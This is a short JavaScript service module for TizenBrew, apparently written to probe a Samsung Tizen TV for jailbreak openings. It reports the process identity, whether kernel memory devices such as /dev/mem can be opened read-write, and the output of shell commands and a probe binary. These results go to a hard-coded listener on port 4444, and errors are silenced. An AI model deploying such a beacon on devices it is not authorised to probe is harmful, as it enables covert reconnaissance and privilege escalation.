// TizenBrew service module - ntksys probe
const net = require('net');
const fs = require('fs');
const { execSync } = require('child_process');

const BEACON_IP = '192.168.0.241';
const BEACON_PORT = 4444;

const sock = new net.Socket();
sock.connect(BEACON_PORT, BEACON_IP, () => {
  const lines = [];
  lines.push('=== TizenBrew ntksys probe ===');

  // 1. What uid are we?
  try { lines.push(fs.readFileSync('/proc/self/status', 'utf8').split('\n').slice(0,10).join('\n')); }
  catch(e) { lines.push('status: ' + e.message); }

  // 2. Check ntksys devices
  for (const dev of ['/dev/ntksys', '/dev/ntkhdma', '/dev/sdp_mem', '/dev/mem']) {
    try {
      const fd = fs.openSync(dev, 'r+');
      lines.push(dev + ': EXISTS (opened O_RDWR)');
      fs.closeSync(fd);
    } catch(e) {
      lines.push(dev + ': ' + e.message);
    }
  }

  // 3. Can we exec /bin/sh (signed binary)?
  try {
    const r = execSync('id; uname -a; cat /proc/cmdline', { timeout: 5000 });
    lines.push('exec works:\n' + r.toString());
  } catch(e) {
    lines.push('exec failed: ' + e.message);
  }

  // 4. Try running our probe binary if present
  try {
    const r = execSync('/home/owner/share/tmp/sdk_tools/probe', { timeout: 3000 });
    lines.push('probe exec: ' + r.toString());
  } catch(e) {
    lines.push('probe exec failed: ' + e.message);
  }

  sock.write(lines.join('\n') + '\n=== DONE ===\n');
  sock.end();
});

sock.on('error', (e) => { /* silent */ });
